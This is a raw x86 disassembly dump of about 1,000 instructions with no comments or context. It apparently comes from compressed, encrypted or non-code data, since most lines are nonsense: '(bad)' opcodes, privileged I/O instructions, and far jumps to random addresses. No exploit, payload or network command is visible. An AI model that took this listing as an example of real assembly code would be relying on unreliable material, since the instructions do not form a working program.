  41a89f:	rcr    BYTE PTR [edi],1
  41a8a1:	inc    esi
  41a8a2:	clc    
  41a8a3:	and    ecx,DWORD PTR [ebx-0x6a]
  41a8a6:	ror    BYTE PTR [edx+0x775293c9],cl
  41a8ac:	retf   0x36b8
  41a8af:	mov    dl,0x2f
  41a8b1:	mov    al,0xda
  41a8b3:	inc    ebp
  41a8b4:	cs pop edi
  41a8b6:	call   0xec418c7b
  41a8bb:	push   edi
  41a8bd:	cmp    ah,BYTE PTR [ecx+0xd]
  41a8c0:	into   
  41a8c1:	int3   
  41a8c2:	je     0x41a8ab
  41a8c4:	mov    bl,0xeb
  41a8c6:	ds push esi
  41a8c8:	inc    esi
  41a8c9:	fs jne 0x41a926
  41a8cc:	js     0x41a8df
  41a8ce:	mov    ds,WORD PTR [esi-0x24]
  41a8d1:	jl     0x41a85a
  41a8d3:	sar    BYTE PTR [edx-0x53],0xc2
  41a8d7:	in     eax,dx
  41a8d8:	xchg   esi,eax
  41a8d9:	test   BYTE PTR [ecx-0x5c5f033d],cl
  41a8df:	outs   dx,BYTE PTR ds:[esi]
  41a8e0:	sub    ebx,DWORD PTR [eax]
  41a8e2:	je     0x41a874
  41a8e4:	push   cs
  41a8e5:	call   0x8a745eda
  41a8ea:	outs   dx,DWORD PTR ds:[esi]
  41a8eb:	fs adc eax,0x8c18b3b
  41a8f1:	shl    ebp,0x7a
  41a8f4:	sub    edx,ebp
  41a8f6:	test   eax,0x7fa15b91
  41a8fc:	mov    eax,0x297d70c0
  41a901:	mov    bl,0x8e
  41a903:	xchg   ebx,eax
  41a904:	pop    ecx
  41a905:	and    al,BYTE PTR [ebx]
  41a907:	ss sahf 
  41a909:	dec    edx
  41a90a:	cmc    
  41a90b:	push   eax
  41a90c:	add    dl,BYTE PTR [eax+0x4c]
  41a90f:	jae    0x41a91e
  41a911:	hlt    
  41a912:	and    eax,0x3207cc54
  41a917:	stos   BYTE PTR es:[edi],al
  41a918:	sub    eax,DWORD PTR [ebp+0x10950adb]
  41a91e:	jb     0x41a8b0
  41a920:	and    ax,0x34e5
  41a924:	or     edi,ebp
  41a926:	mov    ebx,0xd2096c4d
  41a92b:	mov    ecx,0xeab00cd3
  41a930:	into   
  41a931:	inc    ebx
  41a932:	sub    ch,BYTE PTR [eax+0x768adb80]
  41a938:	jmp    0x782d:0xc42ae5e6
  41a93f:	ja     0x41a908
  41a941:	mov    ebp,0x823e6993
  41a946:	jae    0x41a95e
  41a948:	ss jg  0x41a907
  41a94b:	push   0xffffffbf
  41a94d:	xchg   edx,eax
  41a94e:	add    al,0xf2
  41a950:	stos   DWORD PTR es:[edi],eax
  41a951:	mov    eax,ebx
  41a953:	push   ebx
  41a954:	mov    al,0xed
  41a956:	adc    eax,0x9b13313f
  41a95b:	sub    DWORD PTR [ecx+eiz*1],0x29
  41a95f:	addr16 xchg esi,eax
  41a961:	(bad)  
  41a962:	lods   al,BYTE PTR ds:[esi]
  41a963:	xchg   bh,al
  41a965:	inc    edx
  41a966:	outs   dx,DWORD PTR ds:[esi]
  41a967:	sahf   
  41a968:	fidiv  WORD PTR [ebp+0x1]
  41a96b:	pop    esp
  41a96c:	dec    ebp
  41a96d:	adc    al,0x42
  41a96f:	inc    ebp
  41a970:	cmp    ebp,DWORD PTR [eax]
  41a972:	mov    ch,0xe5
  41a974:	pop    esp
  41a975:	fimul  WORD PTR [esi+0x44f70907]
  41a97b:	mov    DWORD PTR [edx+0x3f34ebcb],esi
  41a981:	or     eax,0x7e8503b8
  41a986:	mov    BYTE PTR [esi],al
  41a988:	and    al,0x56
  41a98a:	adc    eax,0x27de88e7
  41a98f:	pop    ecx
  41a990:	(bad)  
  41a991:	call   0xf09847ad
  41a996:	in     eax,dx
  41a997:	push   edx
  41a998:	dec    esp
  41a999:	repz lahf 
  41a99b:	sub    al,BYTE PTR [edi]
  41a99d:	push   eax
  41a99e:	loopne 0x41a92f
  41a9a0:	(bad)  
  41a9a1:	sub    ch,bh
  41a9a3:	pop    eax
  41a9a4:	xor    esi,DWORD PTR [ebx]
  41a9a6:	inc    ecx
  41a9a7:	ret    0xf299
  41a9aa:	adc    DWORD PTR [ebp-0x3a],ecx
  41a9ad:	adc    BYTE PTR [ecx-0x582c4838],0x84
  41a9b4:	mov    esp,0xe1d4e0ad
  41a9b9:	mov    edx,0x8b3cf2f6
  41a9be:	xor    ecx,eax
  41a9c0:	push   ecx
  41a9c1:	arpl   WORD PTR [edi+0x437c21f0],ax
  41a9c7:	pop    es
  41a9c8:	dec    al
  41a9ca:	xor    ebp,ecx
  41a9cc:	ins    DWORD PTR es:[edi],dx
  41a9cd:	fistp  DWORD PTR [edi+eax*8]
  41a9d0:	xchg   al,dl
  41a9d2:	loop   0x41a9d3
  41a9d4:	pop    ecx
  41a9d5:	arpl   WORD PTR [eax+0x1c],sp
  41a9d8:	das    
  41a9d9:	inc    ebx
  41a9da:	jmp    0x41a987
  41a9dc:	retf   
  41a9dd:	sbb    bl,BYTE PTR [edx+0x27a9ae6a]
  41a9e3:	out    dx,al
  41a9e4:	inc    edx
  41a9e5:	and    eax,DWORD PTR [ebp+0x1f50ee0b]
  41a9eb:	cmp    dl,BYTE PTR ds:0xa13a6b54
  41a9f1:	push   ecx
  41a9f2:	(bad)  
  41a9f3:	mov    eax,0x2624da93
  41a9f8:	sbb    eax,0x96f08cff
  41a9fd:	sbb    BYTE PTR [edx-0x4f5e11a7],0xd2
  41aa04:	je     0x41a9f2
  41aa06:	pusha  
  41aa07:	and    BYTE PTR ds:0xc146b445,ah
  41aa0d:	mov    edx,0x5b89239e
  41aa12:	mov    ah,0xc6
  41aa14:	inc    edx
  41aa15:	push   esp
  41aa16:	bound  edx,QWORD PTR [ecx]
  41aa18:	call   0xf8cda9d4
  41aa1d:	mov    al,ds:0x68064c23
  41aa22:	arpl   WORD PTR ds:0x77b16903,dx
  41aa28:	repnz dec ebx
  41aa2a:	test   DWORD PTR [edx+ecx*8],edi
  41aa2d:	lods   eax,DWORD PTR ds:[esi]
  41aa2e:	push   0xe2a887d8
  41aa33:	gs pushf 
  41aa35:	xor    al,0x82
  41aa37:	and    edx,DWORD PTR [eax+0x1]
  41aa3a:	inc    esi
  41aa3b:	fs inc ebx
  41aa3d:	test   dh,dl
  41aa3f:	(bad)  
  41aa40:	shr    BYTE PTR [edx-0x4a],cl
  41aa43:	mov    esi,0x92f15f71
  41aa48:	sbb    ebx,DWORD PTR [edi-0x39]
  41aa4b:	inc    ecx
  41aa4c:	icebp  
  41aa4d:	or     ebp,DWORD PTR [ecx]
  41aa4f:	ins    BYTE PTR es:[edi],dx
  41aa50:	jg     0x41aa24
  41aa52:	mov    edx,0xb340075d
  41aa57:	sub    edx,DWORD PTR [ebx]
  41aa59:	dec    edi
  41aa5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa5c:	mov    al,ds:0x4310111e
  41aa61:	adc    ebx,DWORD PTR [ebp+0xd1b8b65]
  41aa67:	and    BYTE PTR [edi-0x50],bh
  41aa6a:	fldcw  WORD PTR [eax*8-0x537917f8]
  41aa71:	cmp    DWORD PTR [eax+0x43],eax
  41aa74:	leave  
  41aa75:	sub    edx,DWORD PTR [ebp-0x1a]
  41aa78:	sub    al,0x4c
  41aa7a:	xor    DWORD PTR [esi],esi
  41aa7c:	pop    es
  41aa7d:	pop    esp
  41aa7e:	cmp    DWORD PTR [edi],0xffffffc5
  41aa81:	dec    esi
  41aa82:	pop    ecx
  41aa83:	sbb    BYTE PTR [ebx+0x7cf1cd0c],bl
  41aa89:	ficomp WORD PTR [esi+0x645a6225]
  41aa8f:	mov    cl,0xc7
  41aa91:	or     ecx,DWORD PTR [ecx]
  41aa93:	and    ebp,DWORD PTR [ecx+0x39]
  41aa96:	or     BYTE PTR [ebp-0x3b37321e],dh
  41aa9c:	adc    eax,edi
  41aa9e:	ret    
  41aa9f:	jne    0x41aa40
  41aaa1:	push   es
  41aaa2:	mov    BYTE PTR [eax-0x2346ea79],bh
  41aaa8:	retf   0xb241
  41aaab:	mov    cl,0x96
  41aaad:	aam    0xe3
  41aaaf:	inc    esp
  41aab0:	jmp    0x41ab03
  41aab2:	ins    BYTE PTR es:[edi],dx
  41aab3:	pop    eax
  41aab4:	or     edi,0x53
  41aab7:	mul    DWORD PTR [ebx+0x42]
  41aaba:	fdivr  DWORD PTR [edi+eiz*2+0x36]
  41aabe:	popf   
  41aabf:	ins    DWORD PTR es:[edi],dx
  41aac0:	mov    ebx,0x8c68802d
  41aac5:	inc    eax
  41aac6:	leave  
  41aac7:	fisubr WORD PTR [edx]
  41aac9:	test   al,0x13
  41aacb:	sub    DWORD PTR [edi-0x43],esp
  41aace:	aaa    
  41aacf:	add    al,0x7c
  41aad1:	hlt    
  41aad2:	cmp    ecx,DWORD PTR [ebx]
  41aad4:	cmp    BYTE PTR ds:0x9fc8a372,bl
  41aada:	in     al,0xd9
  41aadc:	push   ebx
  41aadd:	mov    al,0xd
  41aadf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aae0:	inc    esi
  41aae1:	add    eax,0x89853afb
  41aae6:	xchg   ecx,eax
  41aae7:	int3   
  41aae8:	stc    
  41aae9:	(bad)  
  41aaeb:	push   cs
  41aaec:	jmp    0x87eb0ae9
  41aaf1:	and    bl,BYTE PTR [ebx+0x7c4aec53]
  41aaf7:	mov    ah,BYTE PTR [esi+0x34]
  41aafa:	out    0x48,eax
  41aafc:	mov    cs,ebx
  41aafe:	(bad)  
  41aaff:	push   0x75
  41ab01:	or     eax,0x4c50ef80
  41ab06:	les    ebx,FWORD PTR [esi]
  41ab08:	pop    eax
  41ab09:	iret   
  41ab0a:	push   cs
  41ab0b:	push   edi
  41ab0c:	mov    al,ds:0x21b1741
  41ab11:	mov    bl,0x10
  41ab13:	xor    al,0x86
  41ab15:	mov    esi,0xfd2af715
  41ab1a:	jp     0x41ab61
  41ab1c:	mov    dh,0x7c
  41ab1e:	popf   
  41ab1f:	xor    esp,0x29
  41ab22:	jmp    0x41ab78
  41ab24:	icebp  
  41ab25:	inc    edx
  41ab26:	(bad)  
  41ab27:	inc    DWORD PTR [ebx-0x57e15e56]
  41ab2d:	clc    
  41ab2e:	or     BYTE PTR [esi-0x2f6ab276],bh
  41ab34:	int    0xea
  41ab36:	and    al,al
  41ab38:	sub    eax,0xeb96539c
  41ab3d:	cwde   
  41ab3e:	or     ch,cl
  41ab40:	sub    al,0xfa
  41ab42:	adc    al,0x9f
  41ab44:	dec    esp
  41ab45:	add    al,BYTE PTR [edi-0x2b]
  41ab48:	sahf   
  41ab49:	and    ecx,DWORD PTR [edx]
  41ab4b:	jbe    0x41aaf7
  41ab4d:	mov    ecx,0x1549711c
  41ab52:	xor    DWORD PTR [ecx],ebp
  41ab54:	adc    al,0x33
  41ab56:	in     al,0x6c
  41ab58:	dec    ecx
  41ab59:	mov    dh,0x8c
  41ab5b:	in     eax,dx
  41ab5c:	or     eax,0x45c04370
  41ab61:	cmp    ebp,ebx
  41ab63:	sbb    BYTE PTR [edx+0x44851f87],0xca
  41ab6a:	cmp    eax,0xc28a5522
  41ab6f:	inc    edi
  41ab70:	pop    esi
  41ab71:	into   
  41ab72:	push   ecx
  41ab73:	idiv   DWORD PTR ds:0x14f42554
  41ab79:	or     edx,0xffffffb4
  41ab7c:	xor    BYTE PTR [ebp+0x1455e05],dl
  41ab82:	out    0xab,eax
  41ab84:	repz lock push ss
  41ab87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab88:	popf   
  41ab89:	out    dx,eax
  41ab8a:	and    ebp,0xaf582059
  41ab90:	(bad)  
  41ab91:	outs   dx,DWORD PTR ds:[esi]
  41ab92:	aad    0x50
  41ab94:	fnstenv [ebx+0x16f9773e]
  41ab9a:	pop    ebp
  41ab9b:	nop
  41ab9c:	gs xor al,0x9c
  41ab9f:	arpl   bx,ax
  41aba1:	call   0xd7c0:0xf6d76c5a
  41aba8:	int3   
  41aba9:	hlt    
  41abaa:	ror    DWORD PTR [ebx],cl
  41abac:	ret    
  41abad:	gs adc al,ch
  41abb0:	xlat   BYTE PTR ds:[ebx]
  41abb1:	xor    esp,DWORD PTR [edx+ebx*4-0x48]
  41abb5:	repnz inc eax
  41abb7:	or     esi,esp
  41abb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abba:	add    ah,ch
  41abbc:	stos   DWORD PTR es:[edi],eax
  41abbd:	xchg   edi,eax
  41abbe:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abc0:	enter  0x3a72,0x8b
  41abc4:	pop    ebp
  41abc5:	cwde   
  41abc6:	xchg   esi,eax
  41abc7:	dec    ecx
  41abc8:	xor    bl,cl
  41abca:	xchg   DWORD PTR [edx+ebp*2-0x4f5068ab],ebx
  41abd1:	xchg   edx,eax
  41abd2:	ins    DWORD PTR es:[edi],dx
  41abd3:	std    
  41abd4:	or     BYTE PTR [edx],0xd6
  41abd7:	pop    ebp
  41abd8:	jmp    0xda2c:0x8d313f29
  41abdf:	cdq    
  41abe0:	xlat   BYTE PTR ds:[ebx]
  41abe1:	push   ecx
  41abe2:	cmc    
  41abe3:	mov    DWORD PTR [eax+0x6a5b08d9],ebp
  41abe9:	into   
  41abea:	imul   ebp,DWORD PTR [ebx],0x19
  41abed:	in     eax,dx
  41abee:	fidivr DWORD PTR [ebx+0x50e8e44e]
  41abf4:	jae    0x41ac4a
  41abf6:	jmp    0xefa8c4c7
  41abfb:	or     DWORD PTR [edi+0x43],eax
  41abfe:	or     DWORD PTR [ebx+0x25b7268c],edx
  41ac04:	dec    esi
  41ac05:	(bad)  
  41ac06:	rcr    DWORD PTR [ebx],1
  41ac08:	add    BYTE PTR [edi+0x38649d98],ah
  41ac0e:	leave  
  41ac0f:	lea    edx,[ebx+0x47]
  41ac12:	add    ebp,DWORD PTR [eax]
  41ac14:	aam    0xb9
  41ac16:	sbb    esi,DWORD PTR cs:[ebx+0x565b5d8b]
  41ac1d:	sub    al,0xfb
  41ac1f:	jmp    0xe39ae712
  41ac24:	xchg   edi,eax
  41ac25:	and    DWORD PTR [edi-0xd],esi
  41ac28:	mov    cl,0x9f
  41ac2a:	mov    ebp,0x8fe06e6
  41ac2f:	inc    esi
  41ac30:	out    0x9c,al
  41ac32:	push   esp
  41ac33:	adc    cl,ch
  41ac35:	das    
  41ac36:	call   0xc523ea04
  41ac3b:	push   ss
  41ac3c:	frstor [edx-0xda69b5d]
  41ac42:	add    al,0xa
  41ac44:	loopne 0x41abcb
  41ac46:	add    BYTE PTR gs:[edi],dh
  41ac49:	mov    DWORD PTR [ebx],edx
  41ac4b:	enter  0xdd77,0x8
  41ac4f:	cmp    al,0x5a
  41ac51:	daa    
  41ac52:	mov    ch,0xdb
  41ac54:	and    DWORD PTR [esi+ebx*2-0x79],esp
  41ac58:	cdq    
  41ac59:	adc    ah,BYTE PTR [edx-0x39cab23d]
  41ac5f:	mov    ebp,0x897b36f1
  41ac64:	jle    0x41ac9e
  41ac66:	nop
  41ac67:	mov    bl,0xd8
  41ac69:	ret    0xfee3
  41ac6c:	retf   0xd856
  41ac6f:	sub    al,BYTE PTR [esi]
  41ac71:	rcr    DWORD PTR [ecx],1
  41ac73:	mov    ds:0x3c40f45a,eax
  41ac78:	jge    0x41ac72
  41ac7a:	mov    ch,0xba
  41ac7c:	pop    edx
  41ac7d:	mov    BYTE PTR [esi],dh
  41ac7f:	js     0x41ac6f
  41ac81:	fmul   DWORD PTR [edi+0x73]
  41ac84:	dec    esp
  41ac85:	inc    edx
  41ac86:	xchg   edx,eax
  41ac87:	xor    BYTE PTR [edx+0x4c],bl
  41ac8a:	push   cs
  41ac8b:	xor    al,0x1c
  41ac8d:	dec    edx
  41ac8e:	cli    
  41ac8f:	sar    DWORD PTR ds:0xfc2796aa,0x84
  41ac96:	xor    ecx,0x32
  41ac99:	mov    dl,0xc5
  41ac9b:	retf   0x871e
  41ac9e:	jg     0x41acbc
  41aca0:	jmp    0x41ad16
  41aca2:	inc    eax
  41aca3:	mov    ecx,0x9cf8ab4c
  41aca8:	enter  0x70cc,0x46
  41acac:	inc    esi
  41acae:	and    bh,bl
  41acb0:	arpl   ax,dx
  41acb2:	sbb    dl,ah
  41acb4:	in     eax,dx
  41acb5:	push   eax
  41acb6:	ss inc eax
  41acb8:	adc    edx,DWORD PTR [esi]
  41acba:	call   0x310c:0x652de0cb
  41acc1:	daa    
  41acc2:	cmp    dl,dl
  41acc4:	in     al,0xb
  41acc6:	fisub  WORD PTR es:[esi+0x41ec3e04]
  41accd:	aaa    
  41acce:	xor    BYTE PTR [edi],dl
  41acd0:	test   DWORD PTR [edi-0x6],ecx
  41acd3:	jno    0x41ac9a
  41acd5:	fiadd  DWORD PTR [ecx-0xf6cfea5]
  41acdb:	arpl   WORD PTR [ebp+0x4f],di
  41acde:	outs   dx,DWORD PTR ds:[esi]
  41acdf:	sbb    ebx,ebp
  41ace1:	mov    ds:0x585d44ae,eax
  41ace6:	fnstsw WORD PTR [edx+0x3f72fee1]
  41acec:	sub    al,0xbd
  41acee:	push   0x17223ca8
  41acf3:	data16 sbb al,al
  41acf6:	xchg   eax,ebp
  41acf8:	push   ebx
  41acf9:	mov    ebx,0x1e3b6b03
  41acfe:	ja     0x41ad0d
  41ad00:	daa    
  41ad01:	hlt    
  41ad02:	adc    DWORD PTR [esi+0x24],edi
  41ad05:	popf   
  41ad06:	test   eax,0x6b72bf9f
  41ad0b:	repz xchg ecx,eax
  41ad0d:	adc    ebp,DWORD PTR [ebp-0x579dd827]
  41ad13:	leave  
  41ad14:	fwait
  41ad15:	lods   eax,DWORD PTR ds:[esi]
  41ad16:	cmp    DWORD PTR [edx+0x380d38df],ecx
  41ad1c:	xchg   DWORD PTR [edx],esi
  41ad1e:	xchg   ebp,ebx
  41ad20:	and    eax,0x2d8346b3
  41ad25:	lds    ebp,FWORD PTR [ebp+eax*8-0x80636d1]
  41ad2c:	outs   dx,BYTE PTR ds:[esi]
  41ad2d:	xchg   DWORD PTR ds:[edx+0x67699944],esp
  41ad34:	xlat   BYTE PTR ds:[ebx]
  41ad35:	jecxz  0x41ad47
  41ad37:	pop    ds
  41ad38:	add    DWORD PTR [eax+0x2d],ebp
  41ad3b:	pop    ss
  41ad3c:	jmp    0x4660e7c1
  41ad41:	in     eax,0xdd
  41ad43:	dec    esp
  41ad44:	or     ch,BYTE PTR [ebx-0x8]
  41ad47:	sete   BYTE PTR [ebx-0x3d92b5e0]
  41ad4e:	fcomp  QWORD PTR [edx+0x1f]
  41ad51:	inc    esp
  41ad52:	test   DWORD PTR [edx],0x3b6e4e73
  41ad58:	stc    
  41ad59:	push   ebp
  41ad5a:	ret    0x2299
  41ad5d:	ret    0xdbc7
  41ad60:	sub    cl,al
  41ad62:	pusha  
  41ad63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad64:	jg     0x41adda
  41ad66:	loop   0x41ad48
  41ad68:	sahf   
  41ad69:	les    esp,FWORD PTR [edi-0x792cc750]
  41ad6f:	jl     0x41ad4c
  41ad71:	ret    0x84bf
  41ad74:	add    eax,0xfa769b56
  41ad79:	hlt    
  41ad7a:	sar    DWORD PTR [edi+0x4],1
  41ad7d:	push   edx
  41ad7e:	pop    edx
  41ad7f:	cmp    esp,ebx
  41ad81:	rcr    BYTE PTR [edx+0x2e],cl
  41ad84:	jmp    0x41ad81
  41ad86:	cld    
  41ad87:	or     al,0x1c
  41ad89:	adc    BYTE PTR [ebx+edi*2+0x28dc08fb],0xd
  41ad91:	push   esi
  41ad92:	sub    al,BYTE PTR [ecx+0x789d01ff]
  41ad98:	push   0x5e0ce5c7
  41ad9d:	dec    ebx
  41ad9e:	rcr    DWORD PTR [bx+si],0xcb
  41ada2:	push   esi
  41ada3:	pop    ebp
  41ada4:	pop    esi
  41ada5:	xchg   DWORD PTR [edx+edx*4],ebx
  41ada8:	and    edi,DWORD PTR [esi+edx*1]
  41adab:	out    0x42,al
  41adad:	inc    esi
  41adae:	add    esi,eax
  41adb0:	ins    DWORD PTR es:[edi],dx
  41adb1:	into   
  41adb2:	and    esi,DWORD PTR [esi]
  41adb4:	add    eax,0x8dd9cee7
  41adb9:	dec    ebx
  41adba:	lock adc DWORD PTR [ebp+0xe959dac],ecx
  41adc1:	in     al,0xe
  41adc3:	jnp    0x41adde
  41adc5:	mov    dh,0xb5
  41adc7:	xchg   esp,eax
  41adc8:	cmp    BYTE PTR [eax-0xb78dd08],0x6f
  41adcf:	xchg   ecx,eax
  41add0:	mov    ds:0x93fea777,eax
  41add5:	xchg   edx,eax
  41add6:	test   al,0x9
  41add8:	iret   
  41add9:	rcl    BYTE PTR [edi+0x2ab7e03a],0x8e
  41ade0:	(bad)  
  41ade2:	rcl    DWORD PTR [ecx+0x5f],1
  41ade5:	sbb    al,0x7
  41ade7:	pop    edx
  41ade8:	outs   dx,DWORD PTR ds:[esi]
  41ade9:	mov    ds:0xa9266a6c,eax
  41adee:	and    DWORD PTR [edx-0x28c94453],esi
  41adf4:	lahf   
  41adf5:	es scas eax,DWORD PTR es:[edi]
  41adf7:	and    dh,BYTE PTR [eax]
  41adf9:	pusha  
  41adfa:	jb     0x41ae26
  41adfc:	push   esp
  41adfd:	fistp  QWORD PTR [ebp-0x4e6c46a6]
  41ae03:	mov    ah,0x97
  41ae05:	jg     0x41ad97
  41ae07:	js     0x41ae43
  41ae09:	fisubr WORD PTR ds:0x9a750a06
  41ae0f:	fldenv [ebx]
  41ae11:	pop    ebp
  41ae12:	ins    DWORD PTR es:[edi],dx
  41ae13:	jle    0x41adef
  41ae15:	push   edi
  41ae16:	nop
  41ae17:	pop    ss
  41ae18:	mov    BYTE PTR [ebp-0x48],bl
  41ae1b:	add    al,0x1e
  41ae1d:	add    eax,DWORD PTR [ebp+0x4e745a41]
  41ae23:	add    dh,BYTE PTR [edi+0xa]
  41ae26:	in     eax,0x57
  41ae28:	inc    ebp
  41ae29:	cdq    
  41ae2a:	out    dx,al
  41ae2b:	push   ss
  41ae2c:	dec    eax
  41ae2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae2e:	sub    DWORD PTR [ebp+eiz*8-0x5],esi
  41ae32:	mov    ebx,0xd80018a
  41ae37:	imul   esp,eax,0xb4d06a4f
  41ae3d:	xor    ah,BYTE PTR [ebp+0x50]
  41ae40:	sub    DWORD PTR [edx],ebp
  41ae42:	mov    dh,0x95
  41ae44:	(bad)  
  41ae45:	xor    DWORD PTR [ebx+ebx*2],eax
  41ae48:	inc    ecx
  41ae49:	or     bl,BYTE PTR [eax]
  41ae4b:	cmp    DWORD PTR [edi],ecx
  41ae4d:	lds    eax,FWORD PTR [ebx+0xa7dc5df]
  41ae53:	inc    eax
  41ae54:	push   eax
  41ae55:	sbb    al,0x22
  41ae57:	inc    edi
  41ae58:	and    ebp,0xffffffeb
  41ae5b:	neg    DWORD PTR [ebx]
  41ae5d:	jp     0x41aea5
  41ae5f:	in     al,dx
  41ae60:	lock nop
  41ae62:	and    DWORD PTR [ebx],ebp
  41ae64:	jnp    0x41ae92
  41ae66:	xchg   esp,eax
  41ae67:	mov    eax,0x7091cdef
  41ae6c:	dec    edi
  41ae6d:	dec    edx
  41ae6e:	jmp    0x28e7:0xc4e928b2
  41ae75:	xor    eax,0x3732968f
  41ae7a:	mov    ds:0xcd3dbf60,al
  41ae7f:	pop    edi
  41ae80:	out    0x71,eax
  41ae82:	addr16 call 0x30d2:0x84019a1d
  41ae8a:	jne    0x41ae3c
  41ae8c:	es hlt 
  41ae8e:	sub    DWORD PTR [ecx+esi*2],eax
  41ae91:	(bad)  
  41ae92:	sub    BYTE PTR [ecx+ecx*4+0x44],0xb1
  41ae97:	xlat   BYTE PTR ds:[ebx]
  41ae98:	arpl   si,bx
  41ae9a:	adc    BYTE PTR [ebx],al
  41ae9c:	jecxz  0x41ae30
  41ae9e:	xlat   BYTE PTR ds:[ebx]
  41ae9f:	pop    es
  41aea0:	mov    esi,DWORD PTR [edi+eax*2+0x1]
  41aea4:	mov    esp,ebp
  41aea6:	cld    
  41aea7:	out    0xeb,al
  41aea9:	stos   BYTE PTR es:[edi],al
  41aeaa:	mov    bh,0xd4
  41aeac:	dec    eax
  41aead:	mov    eax,0x4b00a660
  41aeb2:	(bad)  
  41aeb3:	push   ss
  41aeb4:	clc    
  41aeb5:	ds rol ebp,0xfc
  41aeb9:	je     0x41af13
  41aebb:	dec    eax
  41aebc:	daa    
  41aebd:	pop    ebp
  41aebe:	fs loope 0x41aef0
  41aec1:	push   0xffffffe8
  41aec3:	mov    al,ds:0xe000bb17
  41aec8:	sub    al,0xf7
  41aeca:	cmp    eax,0xca0d2d11
  41aecf:	popa   
  41aed0:	push   0xffffff96
  41aed2:	repnz test eax,0xd572fe32
  41aed8:	inc    esp
  41aed9:	lea    esp,[edx]
  41aedb:	sbb    DWORD PTR [edi-0x4666a145],edi
  41aee1:	fsubr  DWORD PTR [eax+edx*4-0x8b7560]
  41aee8:	in     al,dx
  41aee9:	mov    eax,0xee2da005
  41aeee:	jl     0x41aeb8
  41aef0:	sub    ebx,DWORD PTR [ecx+0x4]
  41aef3:	sub    al,0xe6
  41aef5:	je     0x41aea4
  41aef7:	pop    edi
  41aef8:	and    DWORD PTR [edx+edi*8],esp
  41aefb:	pop    eax
  41aefc:	adc    eax,DWORD PTR [ebp+0x33048d34]
  41af02:	dec    edi
  41af03:	dec    esp
  41af04:	xchg   esp,eax
  41af05:	js     0x41aecf
  41af07:	into   
  41af08:	leave  
  41af09:	call   0xcd18336
  41af0e:	inc    ebx
  41af0f:	sub    DWORD PTR [ebx],edx
  41af11:	outs   dx,DWORD PTR ds:[esi]
  41af12:	ret    0xc14b
  41af15:	and    ah,BYTE PTR [edi+0x4]
  41af18:	adc    ebx,ecx
  41af1a:	and    dl,BYTE PTR [eax]
  41af1c:	aas    
  41af1d:	cld    
  41af1e:	call   0x54dc9b63
  41af23:	into   
  41af24:	rol    BYTE PTR [eax-0x60],cl
  41af27:	mov    ah,0xf9
  41af29:	xchg   edi,eax
  41af2a:	(bad)  
  41af2b:	fiadd  DWORD PTR ds:0x29d35d
  41af31:	(bad)  
  41af32:	mov    al,ds:0x44e864bc
  41af37:	xor    edi,ebp
  41af39:	das    
  41af3a:	lock xchg esp,eax
  41af3c:	leave  
  41af3d:	adc    DWORD PTR [eax-0x44],esi
  41af40:	cmc    
  41af41:	popf   
  41af42:	add    al,0xe4
  41af44:	fcom   QWORD PTR [edx-0x51]
  41af47:	fdivr  DWORD PTR [eax+0x16803ea]
  41af4d:	adc    eax,0xa16862e8
  41af52:	sahf   
  41af53:	push   ss
  41af54:	add    BYTE PTR [ebp+eax*8+0x18f63955],dh
  41af5b:	pop    ebx
  41af5c:	dec    ebx
  41af5d:	fiadd  WORD PTR [esp+ecx*4]
  41af60:	repnz sub ecx,eax
  41af63:	xchg   ebp,eax
  41af64:	int3   
  41af65:	jmp    0x41afd4
  41af67:	out    dx,al
  41af68:	jle    0x41af36
  41af6a:	popa   
  41af6b:	inc    esp
  41af6c:	or     DWORD PTR [esi+0x60],0xd5e40992
  41af73:	xchg   esp,eax
  41af74:	xlat   BYTE PTR ds:[ebx]
  41af75:	bound  ecx,QWORD PTR es:[edi]
  41af78:	mov    dh,0x9d
  41af7a:	adc    edx,DWORD PTR [ebp+ecx*8+0x2d64ffce]
  41af81:	sub    cl,BYTE PTR [esi+0x61]
  41af84:	in     al,0x80
  41af86:	std    
  41af87:	fwait
  41af88:	mov    esp,0xbf86242c
  41af8d:	jge    0x41afc2
  41af8f:	rcr    esi,cl
  41af91:	adc    eax,0x9e1564e4
  41af96:	cmp    DWORD PTR [edi],edx
  41af98:	mov    ah,0xa2
  41af9a:	mov    ds:0xa64e1f67,eax
  41af9f:	out    0x59,eax
  41afa1:	jg     0x41af8b
  41afa3:	xchg   edx,eax
  41afa4:	sahf   
  41afa5:	out    dx,eax
  41afa6:	stos   DWORD PTR es:[edi],eax
  41afa7:	sub    cl,BYTE PTR [edx-0x60f895d7]
  41afad:	in     eax,dx
  41afae:	ins    DWORD PTR es:[edi],dx
  41afaf:	sub    cl,BYTE PTR [esi]
  41afb1:	cmp    edx,ecx
  41afb3:	cmp    BYTE PTR [ebx+edi*1-0x7b],dl
  41afb7:	jp     0x41aff3
  41afb9:	mov    es,esi
  41afbb:	mov    bl,0x13
  41afbd:	jmp    0x3588:0x2966edc2
  41afc4:	mov    al,ch
  41afc6:	pop    ds
  41afc7:	add    eax,0x3d1721c9
  41afcc:	jp     0x41b003
  41afce:	push   esp
  41afcf:	mov    eax,0x382f6a75
  41afd4:	shl    BYTE PTR [eax+0x20],cl
  41afd7:	mov    ?,edi
  41afd9:	mov    ch,0x1b
  41afdb:	pop    edi
  41afdc:	icebp  
  41afdd:	mov    ebx,0xc087167d
  41afe2:	in     al,0xa9
  41afe4:	ins    BYTE PTR es:[edi],dx
  41afe5:	mov    eax,tr7
  41afe8:	mov    dh,0xe4
  41afea:	(bad)  
  41afeb:	cs out dx,eax
  41afed:	pop    esp
  41afee:	jge    0x41b027
  41aff0:	arpl   WORD PTR [esp+ecx*1+0x4313901e],sp
  41aff7:	nop
  41aff8:	cmp    DWORD PTR [ecx+0x5d9aeba5],0x52
  41afff:	je     0x41b013
  41b001:	data16 repz das 
  41b004:	mov    esp,DWORD PTR [eax+0x52]
  41b007:	cmp    ecx,esi
  41b009:	loop   0x41afdd
  41b00b:	xchg   ebx,eax
  41b00c:	xor    al,0x3
  41b00e:	sbb    DWORD PTR [ecx],ebx
  41b010:	lods   al,BYTE PTR ds:[esi]
